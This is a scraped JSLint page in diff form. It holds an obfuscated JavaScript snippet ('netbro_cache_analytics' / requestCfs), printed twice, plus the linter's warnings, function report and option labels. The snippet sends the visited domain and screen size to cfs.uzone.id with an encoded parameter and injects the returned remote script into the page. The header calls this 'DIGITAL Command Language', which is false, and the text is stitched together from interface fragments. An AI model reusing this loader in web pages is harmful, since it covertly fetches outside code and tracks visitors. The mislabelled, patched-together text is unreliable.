@@ -1,0 +1,57 @@
+-My build of DIGITAL Command Language:
+-Muhammad Adi Nugroho,S.Adm.Neg.:
+-Via My Notepad++ (HTML Editor):
+if (self==top) {function netbro_cache_analytics(fn, callback):
+JSLint
+Read the instructions.
+Enjoy The Good Parts.
+Source
+
+1
+2
+
+
+if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582ECSaLdwqSpnzHSGCWDvw9NECs0Gw4Tepilace9VyWoVoAtWvPYfgfRxZBX3ydCzEUhFKLwT4pZwdVtTgNxv7Ct3Zet%2bhgXSHLu8hpzSa6NOTSxA3GmUhPmnVIjoy0b4IAvSqWBnffM%2bR3lcu7%2bgZjoBNechPNnoDhefe6T%2bJlLsGPWmVzZzXQ7ZQVp95QkPkn9xBumo1JgGkeMWUnfYK91l%2b1Lpjox8vDH6yqoZ3AWFmmXdWohecC4kkviG%2bG2%2fn%2f2zvEwnRw8JT9pA%2fKgpXKjmQduaudJL5oLCyCzkeya1rE3fpwdwYlpDM2UW7Z2XjJS5Zt6Rmufa%2bhkeDDhu9vvJP6cJv6NSHoOKKXStK9jjJUo%2beVLnZ1WABega0wat8yfcCJR9x0zzELPh1Ki%2bGAXq3c6QZw33SlQ9j6W9dzpIVx2dQaEwrcLC3WG05nk0NWtnN1aw%2bUIzwprEa769qBJj4%2fdP1yEVMA3lyyzYcaPpp8zmpbJFxzstUx3VwJkoeL1ydSGHQ7ehjqtkZ5qlTdjwGYBiDSu8wAGAlTO5%2ffkKgH1uCnFsDxqnsyJDaSqz20oTwG5NqRwVqkgpbcVaEoa59q8dPdxbGavcn2AVZ0%2bSgqaakLObLnYQVRUlFegz7QddSDA9ha2JDKI%2fP0mGnagbQ53Pki8b0sGabJXoN4CKu9Em6hfHqH1mdrOd14P%2bf7MSqlkXzeI%2fLktKR0QPk0I7c2TmQwMakONWovUczI7K692AINYSE4HYsPrOr94o50GzekuoB%2fZbG5XiosIxg6KIBDQixAi5LfLBtHceuYQkWFWPKgpq2ynRnVllkUM1FG%2fLV7c3JGF0GJrckV3nq2OhETNGK4A3VeZK5X77vqP4VEGd1AUP2imq6I4%2fXobJDhZIqe4ZnbWIe3NP9aPLn6wL7gNs4S7kLj%2bMfgWtLr7i0XEEAC9Q%2bxjYil9I7q3xgpldczitrSolJbTEFid%2bv5%2flNGHP0eo3FNSPrA56RufljxpHQgh53qrTbJuEm8pnUBhyqvBKYOU%2fAjX7avEySWVX%2fZ2srx%2fDnrQa32Gw6F7Lb3jmhLFpQdVCbmtN0e8gTS3xlU9db2d%2f8ePIDq0eVlKzIOKxLFhcKvmE7N5TY54azQwYYVcwZPqqeGr1ER6liBk%2fpG09GN0X6CAorvwmkf2Otj2BrTHNN8U1lzqNVBX7fUC2jvfK1kGcoartF7gjbu%2bWg97k3D5g%2bQNZ9iSJ6DSUX%2f25SN%2bAH%2bjsR1vYA8G15bl549zzoEaQo2zQ7tf5dYRKw2glPx4kY9BDmv7r8AHQMLcWJyM8hKGb4%2fJOihdZwd6aQMHZBJl36Dq6RHLQwtYnPkxqTRhjokWFvtu4evMPgZpUOoL12%2bOQrhh8UAlc%2ftKK9AtrnBb4g0sESnTBAg%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};
+JSLintclear
+Warnings
+JSLint was unable to finish.
+1.110Unexpected 'function'.
+if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582ECSaLdwqSpnzHSGCWDvw9NECs0Gw4Tepilace9VyWoVoAtWvPYfgfRxZBX3ydCzEUhFKLwT4pZwdVtTgNxv7Ct3Zet%2bhgXSHLu8hpzSa6NOTSxA3GmUhPmnVIjoy0b4IAvSqWBnffM%2bR3lcu7%2bgZjoBNechPNnoDhefe6T%2bJlLsGPWmVzZzXQ7ZQVp95QkPkn9xBumo1JgGkeMWUnfYK91l%2b1Lpjox8vDH6yqoZ3AWFmmXdWohecC4kkviG%2bG2%2fn%2f2zvEwnRw8JT9pA%2fKgpXKjmQduaudJL5oLCyCzkeya1rE3fpwdwYlpDM2UW7Z2XjJS5Zt6Rmufa%2bhkeDDhu9vvJP6cJv6NSHoOKKXStK9jjJUo%2beVLnZ1WABega0wat8yfcCJR9x0zzELPh1Ki%2bGAXq3c6QZw33SlQ9j6W9dzpIVx2dQaEwrcLC3WG05nk0NWtnN1aw%2bUIzwprEa769qBJj4%2fdP1yEVMA3lyyzYcaPpp8zmpbJFxzstUx3VwJkoeL1ydSGHQ7ehjqtkZ5qlTdjwGYBiDSu8wAGAlTO5%2ffkKgH1uCnFsDxqnsyJDaSqz20oTwG5NqRwVqkgpbcVaEoa59q8dPdxbGavcn2AVZ0%2bSgqaakLObLnYQVRUlFegz7QddSDA9ha2JDKI%2fP0mGnagbQ53Pki8b0sGabJXoN4CKu9Em6hfHqH1mdrOd14P%2bf7MSqlkXzeI%2fLktKR0QPk0I7c2TmQwMakONWovUczI7K692AINYSE4HYsPrOr94o50GzekuoB%2fZbG5XiosIxg6KIBDQixAi5LfLBtHceuYQkWFWPKgpq2ynRnVllkUM1FG%2fLV7c3JGF0GJrckV3nq2OhETNGK4A3VeZK5X77vqP4VEGd1AUP2imq6I4%2fXobJDhZIqe4ZnbWIe3NP9aPLn6wL7gNs4S7kLj%2bMfgWtLr7i0XEEAC9Q%2bxjYil9I7q3xgpldczitrSolJbTEFid%2bv5%2flNGHP0eo3FNSPrA56RufljxpHQgh53qrTbJuEm8pnUBhyqvBKYOU%2fAjX7avEySWVX%2fZ2srx%2fDnrQa32Gw6F7Lb3jmhLFpQdVCbmtN0e8gTS3xlU9db2d%2f8ePIDq0eVlKzIOKxLFhcKvmE7N5TY54azQwYYVcwZPqqeGr1ER6liBk%2fpG09GN0X6CAorvwmkf2Otj2BrTHNN8U1lzqNVBX7fUC2jvfK1kGcoartF7gjbu%2bWg97k3D5g%2bQNZ9iSJ6DSUX%2f25SN%2bAH%2bjsR1vYA8G15bl549zzoEaQo2zQ7tf5dYRKw2glPx4kY9BDmv7r8AHQMLcWJyM8hKGb4%2fJOihdZwd6aQMHZBJl36Dq6RHLQwtYnPkxqTRhjokWFvtu4evMPgZpUOoL12%2bOQrhh8UAlc%2ftKK9AtrnBb4g0sESnTBAg%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};
+Function Report
+global
+netbro_cache_analytics
+1
+netbro_cache_analytics(fn, callback)
+parameter
+callback, fn
+1
+«setTimeout»()
+JSLint edition 2016-08-12
+select propertyJSLintclearclear options
+Options
+Assume...
+in development
+ES6
+a browser
+CouchDB
+Node.js
+
+Fudge...
+First line number is 1
+Tolerate...
+bitwise operators
+eval
+for statement
+multiple vars
+single quote strings
+this
+whitespace mess
+Number...
+
+Maximum line length
+
+Maximum warnings
+Global variables...
+imported globals here
+
+
